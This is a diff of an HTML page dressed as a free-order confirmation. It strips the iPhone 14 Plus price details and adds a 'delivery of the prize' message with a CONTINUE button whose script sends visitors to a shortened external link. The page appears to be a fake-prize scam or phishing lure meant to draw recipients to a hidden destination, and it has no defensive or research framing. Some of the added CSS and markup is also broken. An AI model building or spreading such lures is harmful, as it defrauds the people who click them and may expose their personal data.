@@ -12,6 +12,32 @@
             text-align: center;
             background-color: #f9f9f9;
         }
+                .button-container {
+            text-align: center;
+        }
+        .button-container {
+            text-align: center;
+        }
+        .green-button {
+            padding: 10px 20px;
+            background-color: #4caf50; /* Warna hijau */
+            color: white; /* Warna teks */
+            border: none; /* Hilangkan border */
+            border-radius: 5px; /* Sudut tombol membulat */
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.2s; /* Animasi saat hover */
+            margin: 10px; /* Spasi di sekitar tombol */
+        }
+        .green-button:hover {
+            background-color: #45a049; /* Warna hijau lebih gelap saat hover */
+            transform: scale(1.05); /* Efek memperbesar tombol */
+        }
+        .green-button:active {
+            background-color: #3e8e41; /* Warna hijau lebih gelap saat tombol ditekan */
+            transform: scale(0.95); /* Efek memperkecil tombol */
+        }
         .container {
             max-width: 600px;
             margin: 50px auto;
@@ -41,6 +67,18 @@
         .item-image {
             text-align: center;
             margin-bottom: 20px;
+        }
+                .text-area {
+            max-width: 600px;
+            margin: 20px auto;
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            font-size: 24px;
+            font-weight: bold;
+                }
+        .text .item:last-child {
+            font-weight: bold;
         }
         .item-image a img {
             max-width: 100%;
@@ -92,12 +130,12 @@
         .status-step .status-text {
             flex-grow: 1;
         }
-        .status-step .status-text .title {
+        .status-step .status-text .title .text-area {
             font-weight: bold;
             font-size: 16px;
             margin-bottom: 5px;
         }
-        .status-step .status-text .description {
+        .status-step .status-text .description .text-area {
             font-size: 14px;
             color: #555;
         }
@@ -111,27 +149,12 @@
         </div>
         <div class="order-number">YOUR ORDER NUMBER: #DE-00059048</div>
         <div class="item-image">
-            <a href="https://ibb.co.com/qJ0pkVp">
-                <img src="https://i.ibb.co.com/qJ0pkVp/iphone-14-plus.png" alt="iphone-14-plus" border="0">
-            </a>
+<a href="https://ibb.co.com/g9ktnRx"><img src="https://i.ibb.co.com/9gQyMr7/images-5.jpg" alt="images-5" border="0"></a>
         </div>
         <div class="order-details">
             <div class="item">
-                <span>Item Name:</span>
-                <span>Apple Iphone 14 Plus</span>
-            </div>
-            <div class="item">
                 <span>Quantity:</span>
                 <span>1</span>
-            </div>
-            <div class="item">
-                <span>Price:</span>
-                <span>$830</span>
-            </div>
-            <div class="item">
-                <span>Promotion applied</span>
-                <span>$-830</span>
-            </div>
             <div class="item">
                 <span>Total:</span>
                 <span>$0.00</span>
@@ -168,5 +191,18 @@
             </div>
         </div>
     </div>
+                   <div class="text-area">
+            Please click continue to proceed with the delivery of the prize to your address 
+            <br>
+                <div class="button-container">
+        <button class="green-button" onclick="redirectToPage()">CONTINUE</button>
+    </div>
+        </div> 
+        <script>
+        function redirectToPage() {
+            const targetUrl = "https://smrturl.co/cjjmedia12~596375z";
+            window.location.href = targetUrl;
+        }
+    </script>
 </body>
 </html>
